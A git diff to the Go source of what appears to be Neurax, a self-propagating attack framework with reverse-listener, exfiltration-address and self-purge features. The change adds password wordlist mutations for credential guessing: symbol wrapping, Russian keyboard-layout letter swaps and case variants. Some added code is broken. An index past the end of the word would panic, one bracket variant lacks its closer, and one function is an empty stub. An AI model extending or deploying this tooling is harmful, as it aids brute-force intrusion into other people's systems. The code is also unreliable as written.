@@ -50,6 +50,7 @@ type __NeuraxConfig struct {
 	ReverseListener string
 	PreventReexec   bool
 	ExfilAddr       string
+	ExpandWordlist  bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -76,6 +77,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ReverseListener: "none",
 	PreventReexec:   true,
 	ExfilAddr:       "none",
+	ExpandWordlist:  false,
 }
 
 //Verbose error printing
@@ -478,20 +480,76 @@ func NeuraxPurgeSelf() {
 	os.Exit(0)
 }
 
+func WordEncapsule(word string) []string {
+	return []string{
+		"!" + word + "!",
+		"?" + word + "?",
+		":" + word + ":",
+		"@" + word + "@",
+		"#" + word + "#",
+		"$" + word + "$",
+		"%" + word + "%",
+		"^" + word + "^",
+		"&" + word + "&",
+		"*" + word + "*",
+		"(" + word + ")",
+		"[" + word + "",
+		"<" + word + ">",
+	}
+}
+
+func WordCyryllicReplace(word string) []string {
+	wordlist := []string{}
+	refs := map[string]string{
+		"й": "q", "ц": "w", "у": "e",
+		"к": "r", "е": "t", "н": "y",
+		"г": "u", "ш": "i", "щ": "o",
+		"з": "p", "ф": "a", "ы": "s",
+		"в": "d", "а": "f", "п": "g",
+		"р": "h", "о": "j", "л": "k",
+		"д": "l", "я": "z", "ч": "x",
+		"с": "c", "м": "v", "и": "b",
+		"т": "n", "ь": "m"}
+
+	rus_word := word
+	for k, v := range refs {
+		rus_word = strings.Replace(rus_word, k, v, -1)
+	}
+	wordlist = append(wordlist, rus_word)
+
+	nrus_word := word
+	for k, v := range refs {
+		nrus_word = strings.Replace(nrus_word, v, k, -1)
+	}
+	wordlist = append(wordlist, nrus_word)
+
+	return wordlist
+}
+
+func RussianRoulette() {
+
+}
+
 //Returns transformed words from input slice
 func NeuraxWordlist(words []string) []string {
 	wordlist := []string{}
 	for _, word := range words {
 		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
+		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)]))
 		wordlist = append(wordlist, strings.ToUpper(word))
 		wordlist = append(wordlist, coldfire.Revert(word))
 		wordlist = append(wordlist, first_to_upper)
+		wordlist = append(wordlist, last_to_upper)
 		wordlist = append(wordlist, first_to_upper+"1")
 		wordlist = append(wordlist, first_to_upper+"12")
 		wordlist = append(wordlist, first_to_upper+"123")
 		wordlist = append(wordlist, word+"1")
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
+		if NeuraxConfig.ExpandWordlist {
+			wordlist = append(wordlist, WordEncapsule(word)...)
+			wordlist = append(wordlist, WordCyryllicReplace(word)...)
+		}
 	}
 	return wordlist
 }
